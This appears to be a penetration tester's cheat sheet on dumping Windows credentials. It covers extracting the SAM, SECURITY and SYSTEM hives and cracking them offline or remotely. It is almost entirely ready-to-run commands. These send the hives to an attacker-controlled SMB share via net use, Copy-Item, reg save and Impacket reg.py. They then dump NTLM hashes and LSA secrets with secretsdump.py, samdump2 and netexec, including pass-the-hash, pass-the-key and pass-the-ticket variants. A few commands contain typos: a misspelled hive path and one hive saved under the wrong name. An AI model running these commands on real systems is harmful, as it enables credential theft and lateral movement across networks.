---
Primary_category: "[[WINDOWS CREDENTIALS DUMPING]]"
title: ""
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags: 
cssclasses: 
---

###### PRIMARY CATEGORY → [[WINDOWS CREDENTIALS DUMPING]]

#### *Theory*

***Target Information*** 🎯

- ***SAM → Hashes LM and NTLM***

- ***SECURITY → LSA Secrets (Cached Credentials for Domain Accounts...)***

Both files have to be extracted from the target

However, since the sensitive data in this files is encrypted using the ***Bootkey/Syskey*** symmetric key stored in the ***SYSTEM*** registry hive, we also need it to decrypt them

So, this can be done in the following ways depending on the state of the target system

---

#### *Exfiltration - Down Windows*

##### *OS File System*

###### *From the Attacker*

```bash
smbserver.py -smb2support -username <USER> -password <PASSWORD> <SHARE_NAME> <SHARE_PATH>
```

```bash
net use X: \\<ATTACKER>\<SHARED_FOLDER> /USER:<USER> <PASSWORD>
```

###### *From the Target*

```bash
Copy-Item -Force -Path "C:\Windows\System32\Config\SAM", "C:\Windows\System32\Config\Security", "C:\Windows\System32\Config\SYSTEM" -Destination "X:"
```

---

#### *Exfiltration - Live Windows*

##### *Windows Registry*

> ***Registry Hives***

###### *From the Attacker*

```bash
smbserver.py -smb2support -username <USER> -password <PASSWORD> <SHARE_NAME> <SHARE_PATH>
```

###### *From the Target*

```bash
net use X: \\<ATTACKER>\<SHARED_FOLDER> /USER:<USER> <PASSWORD>
```

```bash
reg save HKLM\sam X:\SAM
reg save HKLM\security X:\SAM
reg save HKML\system X:\SYSTEM
```

---

#### *Exfiltration - Linux*

##### *Reg.py - Impacket*

> ***[Reg.py](https://github.com/fortra/impacket/blob/master/examples/reg.py)***

###### *Start an SMB Server to receive the data*

> ***[SMBServer.py](https://github.com/Twi1ight/impacket/blob/master/examples/smbserver.py)***

```bash
smbserver.py -smb2support <SHARE> $( pwd )
```

###### *Export the Registry Hives of the Target*

```bash
reg.py '<DOMAIN/WORKGROUP>/<USER>:<PASSWD>@<TARGET>' save -keyName 'HKLM\SAM' -o '\\<ATTACKER>\<SHARE>'
reg.py '<DOMAIN/WORKGROUP>/<USER>:<PASSWD>@<TARGET>' save -keyName 'HKLM\SYSTEM' -o '\\<ATTACKER>\<SHARE>'
reg.py '<DOMAIN/WORKGROUP>/<USER>:<PASSWD>@<TARGET>' save -keyName 'HKLM\SECURITY' -o '\\<ATTACKER>\<SHARE>'
```

- ***Backup all of them at once***

```bash
reg.py '<DOMAIN/WORKGROUP>/<USER>:<PASSWD>@<TARGET>' backup -o '\\<ATTACKER>\<SHARE>'
```

---

#### *Secrets Dump*

Once the above files are obtained, just proceed as follows to extract the data from them →

##### *Secretsdump.py*

> ***[SecretsDump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)***

###### *Offline Dumping*

First, all these ***Registry Hives*** must be extracted from the target

Then, these files are parsed locally as follows →

```bash
secretsdump.py -outputfile <FILE> -sam <SAM> -security <SECURITY> -system <SYSTEM> local
```

###### *Remote Dumping*

> ***Plain Password***

```bash
secretsdump.py '<DOMAIN/WORKGROUP>/<USER>:<PASSWD>@<TARGET>'
```

> ***[[PASS THE HASH|Pass the Hash]]***

```bash
secretsdump.py -hashes 'LM:NT' '<DOMAIN/WORKGROUP>/<USER>@<TARGET>'
```

> ***[[PASS THE KEY|Pass the Key]]***

```bash
secretsdump.py -aesKey '<KEY>' '<DOMAIN/WORKGROUP>/<USER>@<TARGET>'
```

> ***[[PASS THE TICKET|Pass the Ticket]]***

```bash
export KRB5CCNAME=<CCACHE>
```

```bash
secretsdump.py -k -no-pass '<DOMAIN/WORKGROUP>/<USER>@<TARGET>'
```

##### *Samdump2*

> ***[Samdump2](https://www.kali.org/tools/samdump2/)***

```bash
samdump2 <SYSTEM> <SAM>
```

> ***Only SAM and SYSTEM, not SECURITY***

##### *Netexec*

> ***[Netexec](https://github.com/Pennyw0rth/NetExec)***

###### *SAM*

```bash
nxc smb <TARGET> --username '<USERNAME>' --password '<PASSWORD>' --local-auth --sam
```

###### *Security (LSA Secrets)*

```bash
nxc smb <TARGET> --username '<USERNAME>' --password '<PASSWORD>' --local-auth --lsa
```
